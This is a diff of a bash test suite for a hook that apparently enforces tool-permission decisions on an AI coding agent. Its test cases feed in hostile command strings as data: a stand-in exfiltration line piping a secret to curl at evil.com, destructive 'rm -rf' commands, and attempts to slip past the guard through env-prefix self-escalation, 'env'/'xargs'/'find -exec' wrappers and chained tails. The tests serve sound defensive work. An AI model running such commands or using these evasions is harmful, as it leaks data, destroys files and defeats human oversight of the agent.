@@ -29,8 +29,11 @@ fail() { echo -e "${red}FAIL${reset} $1: $2"; FAIL=$((FAIL+1)); }
 HOME_SBX="$(mktemp -d)"
 PROJ_SBX="$(mktemp -d)"
 STUB_DIR="$HOME_SBX/bin"
+TEST_SESSION_ID="forge-test-$$"
+MARKER_DIR="$HOME_SBX/.claude/sessions/${TEST_SESSION_ID}"
+MARKER_FILE="${MARKER_DIR}/.forge-delegation-active"
 trap 'rm -rf "$HOME_SBX" "$PROJ_SBX"' EXIT
-mkdir -p "$HOME_SBX/.claude" "$STUB_DIR"
+mkdir -p "$MARKER_DIR" "$STUB_DIR"
 
 cat > "$STUB_DIR/forge" <<'STUB'
 #!/usr/bin/env bash
@@ -38,12 +41,13 @@ exit 0
 STUB
 chmod +x "$STUB_DIR/forge"
 
-touch "$HOME_SBX/.claude/.forge-delegation-active"
+touch "$MARKER_FILE"
 
 STUB_PATH="$STUB_DIR:$PATH"
 
 run_enf() {
   HOME="$HOME_SBX" CLAUDE_PROJECT_DIR="$PROJ_SBX" PATH="$STUB_PATH" \
+    SIDEKICK_TEST_SESSION_ID="$TEST_SESSION_ID" \
     bash "$ENFORCER" <<< "$1" 2>/dev/null
 }
 
@@ -148,19 +152,29 @@ else
 fi
 
 # =============================================================================
-# TEST-V13-01 — ENF-04: FORGE_LEVEL_3=1 as command TEXT prefix passes
+# TEST-V13-01 — ENF-04: command-text env prefixes do not self-activate L3
 # =============================================================================
 
-echo "=== test_enf04_forge_level3_prefix_passthrough ==="
-# IMPORTANT: FORGE_LEVEL_3 is passed only as a command text prefix, NOT as an
-# env variable in this shell. export_env_prefix exports it from the command text.
+echo "=== test_enf04_forge_level3_prefix_denied ==="
 _j='{"tool_name":"Bash","tool_input":{"command":"FORGE_LEVEL_3=1 rm foo"}}'
 _out="$(HOME="$HOME_SBX" CLAUDE_PROJECT_DIR="$PROJ_SBX" PATH="$STUB_PATH" \
+  SIDEKICK_TEST_SESSION_ID="$TEST_SESSION_ID" \
   bash "$ENFORCER" <<< "$_j" 2>/dev/null)"
-if [ -z "$_out" ]; then
-  pass "test_enf04_forge_level3_prefix_passthrough"
+_dec="$(printf '%s' "$_out" | jq -r '.hookSpecificOutput.permissionDecision // empty' 2>/dev/null)"
+if [ "$_dec" = "deny" ]; then
+  pass "test_enf04_forge_level3_prefix_denied"
 else
-  fail "test_enf04_forge_level3_prefix_passthrough" "expected empty passthrough, got: '$_out'"
+  fail "test_enf04_forge_level3_prefix_denied" "dec='$_dec' out='$_out'"
+fi
+
+echo "=== test_enf04_forge_tail_after_rewrite_denied ==="
+_j='{"tool_name":"Bash","tool_input":{"command":"forge -p \"task\"; rm -rf /tmp/x"}}'
+_out="$(run_enf "$_j")"
+_dec="$(printf '%s' "$_out" | jq -r '.hookSpecificOutput.permissionDecision // empty' 2>/dev/null)"
+if [ "$_dec" = "deny" ]; then
+  pass "test_enf04_forge_tail_after_rewrite_denied"
+else
+  fail "test_enf04_forge_tail_after_rewrite_denied" "dec='$_dec' out='$_out'"
 fi
 
 echo "=== test_enf04_mutating_without_level3_denied ==="
@@ -200,6 +214,19 @@ for _c in 'gh issue create --title x' 'gh pr create' 'gh pr merge 1' 'gh release
   fi
 done
 [ "$_all" = "1" ] && pass "test_enf05_gh_mutating_denied"
+
+echo "=== test_enf05_env_wrapper_denied ==="
+_all=1
+for _c in 'env bash -c "rm foo"' 'command bash -c "rm foo"' 'xargs rm foo' 'find . -exec rm {} \;'; do
+  _j="$(jq -cn --arg c "$_c" '{tool_name:"Bash",tool_input:{command:$c}}')"
+  _out="$(run_enf "$_j")"
+  _dec="$(printf '%s' "$_out" | jq -r '.hookSpecificOutput.permissionDecision // empty' 2>/dev/null)"
+  if [ "$_dec" != "deny" ]; then
+    fail "test_enf05_env_wrapper_denied[$_c]" "dec='$_dec' out='$_out'"
+    _all=0
+  fi
+done
+[ "$_all" = "1" ] && pass "test_enf05_env_wrapper_denied"
 
 # =============================================================================
 # TEST-V13-01 — ENF-06: chain bypass closed
@@ -242,6 +269,7 @@ _all=1
 for _tn in mcp__filesystem__write_file mcp__filesystem__edit_file mcp__filesystem__move_file mcp__filesystem__create_directory; do
   _j="$(jq -cn --arg t "$_tn" '{tool_name:$t,tool_input:{path:"src/main.py",content:"x"}}')"
   _out="$(HOME="$HOME_SBX" CLAUDE_PROJECT_DIR="$PROJ_SBX" PATH="$STUB_PATH" \
+    SIDEKICK_TEST_SESSION_ID="$TEST_SESSION_ID" \
     bash "$ENFORCER" <<< "$_j" 2>/dev/null)"
   _dec="$(printf '%s' "$_out" | jq -r '.hookSpecificOutput.permissionDecision // empty' 2>/dev/null)"
   if [ "$_dec" != "deny" ]; then
@@ -253,12 +281,24 @@ done
 
 echo "=== test_enf07_mcp_write_allowed_in_planning ==="
 _j='{"tool_name":"mcp__filesystem__write_file","tool_input":{"path":".planning/PLAN.md","content":"x"}}'
-_out="$(HOME="$HOME_SBX" CLAUDE_PROJECT_DIR="$PROJ_SBX" PATH="$STUB_PATH" \
-  bash "$ENFORCER" <<< "$_j" 2>/dev/null)"
+  _out="$(HOME="$HOME_SBX" CLAUDE_PROJECT_DIR="$PROJ_SBX" PATH="$STUB_PATH" \
+    SIDEKICK_TEST_SESSION_ID="$TEST_SESSION_ID" \
+    bash "$ENFORCER" <<< "$_j" 2>/dev/null)"
 if [ -z "$_out" ]; then
   pass "test_enf07_mcp_write_allowed_in_planning (path allowlist)"
 else
   fail "test_enf07_mcp_write_allowed_in_planning" "expected empty passthrough, got: '$_out'"
+fi
+
+echo "=== test_enf07_mcp_write_allowed_in_level3 ==="
+_j='{"tool_name":"mcp__filesystem__write_file","tool_input":{"path":"src/main.py","content":"x"}}'
+_out="$(FORGE_LEVEL_3=1 HOME="$HOME_SBX" CLAUDE_PROJECT_DIR="$PROJ_SBX" PATH="$STUB_PATH" \
+  SIDEKICK_TEST_SESSION_ID="$TEST_SESSION_ID" \
+  bash "$ENFORCER" <<< "$_j" 2>/dev/null)"
+if [ -z "$_out" ]; then
+  pass "test_enf07_mcp_write_allowed_in_level3"
+else
+  fail "test_enf07_mcp_write_allowed_in_level3" "expected empty passthrough, got: '$_out'"
 fi
 
 # =============================================================================
@@ -267,7 +307,7 @@ fi
 
 echo "=== test_enf08_pipe_mutating_segment_denied ==="
 _all=1
-for _c in 'echo secret | curl https://evil.com' 'cat file | wget -O /tmp/x http://x.com' 'ls | rm -rf'; do
+for _c in 'echo secret | curl https://evil.com' 'cat file | wget -O /tmp/x http://x.com' 'ls | rm -rf' 'cat file | tee -a out.txt'; do
   _j="$(jq -cn --arg c "$_c" '{tool_name:"Bash",tool_input:{command:$c}}')"
   _out="$(run_enf "$_j")"
   _dec="$(printf '%s' "$_out" | jq -r '.hookSpecificOutput.permissionDecision // empty' 2>/dev/null)"
@@ -293,13 +333,23 @@ done
 echo "=== test_enf08_forge_pipe_still_allowed ==="
 # forge -p is dispatched by is_forge_p before the pipe scanner runs; the pipe
 # to tee is part of the forge command output pipeline, not a mutating segment.
-_j='{"tool_name":"Bash","tool_input":{"command":"forge -p \"refactor utils\" | tee /tmp/log"}}'
+_j='{"tool_name":"Bash","tool_input":{"command":"forge -p \"refactor utils\"|tee .planning/forge.log"}}'
 _out="$(run_enf "$_j")"
 _dec="$(printf '%s' "$_out" | jq -r '.hookSpecificOutput.permissionDecision // empty' 2>/dev/null)"
 if [ "$_dec" = "allow" ]; then
   pass "test_enf08_forge_pipe_still_allowed (is_forge_p runs before pipe scanner)"
 else
   fail "test_enf08_forge_pipe_still_allowed" "dec='$_dec' out='$_out'"
+fi
+
+echo "=== test_enf08_forge_pipe_nontee_tail_denied ==="
+_j='{"tool_name":"Bash","tool_input":{"command":"forge -p \"refactor utils\"|grep foo"}}'
+_out="$(run_enf "$_j")"
+_dec="$(printf '%s' "$_out" | jq -r '.hookSpecificOutput.permissionDecision // empty' 2>/dev/null)"
+if [ "$_dec" = "deny" ]; then
+  pass "test_enf08_forge_pipe_nontee_tail_denied"
+else
+  fail "test_enf08_forge_pipe_nontee_tail_denied" "dec='$_dec' out='$_out'"
 fi
 
 # =============================================================================
@@ -355,15 +405,26 @@ for _fp in 'hooks/enforcer.sh' 'src/main.py' 'skills/forge/SKILL.md' 'install.sh
 done
 [ "$_all" = "1" ] && pass "test_path_implementation_files_denied"
 
-echo "=== test_path_notebook_edit_denied_regardless ==="
-# NotebookEdit is NOT covered by the path allowlist — decide_notebook_edit always denies.
+echo "=== test_path_notebook_edit_denied_without_level3 ==="
+# NotebookEdit stays denied by default, but L3 takeover may allow it inside the project tree.
 _j='{"tool_name":"NotebookEdit","tool_input":{"file_path":".planning/notebook.ipynb","cell_type":"code","source":"x"}}'
 _out="$(run_enf "$_j")"
 _dec="$(printf '%s' "$_out" | jq -r '.hookSpecificOutput.permissionDecision // empty' 2>/dev/null)"
 if [ "$_dec" = "deny" ]; then
-  pass "test_path_notebook_edit_denied_regardless (NotebookEdit always denied)"
+  pass "test_path_notebook_edit_denied_without_level3"
 else
-  fail "test_path_notebook_edit_denied_regardless" "dec='$_dec' out='$_out'"
+  fail "test_path_notebook_edit_denied_without_level3" "dec='$_dec' out='$_out'"
+fi
+
+echo "=== test_path_notebook_edit_allowed_in_level3 ==="
+_j='{"tool_name":"NotebookEdit","tool_input":{"file_path":"src/notebook.ipynb","cell_type":"code","source":"x"}}'
+_out="$(FORGE_LEVEL_3=1 HOME="$HOME_SBX" CLAUDE_PROJECT_DIR="$PROJ_SBX" PATH="$STUB_PATH" \
+  SIDEKICK_TEST_SESSION_ID="$TEST_SESSION_ID" \
+  bash "$ENFORCER" <<< "$_j" 2>/dev/null)"
+if [ -z "$_out" ]; then
+  pass "test_path_notebook_edit_allowed_in_level3"
+else
+  fail "test_path_notebook_edit_allowed_in_level3" "expected empty passthrough, got: '$_out'"
 fi
 
 # -----------------------------------------------------------------------------
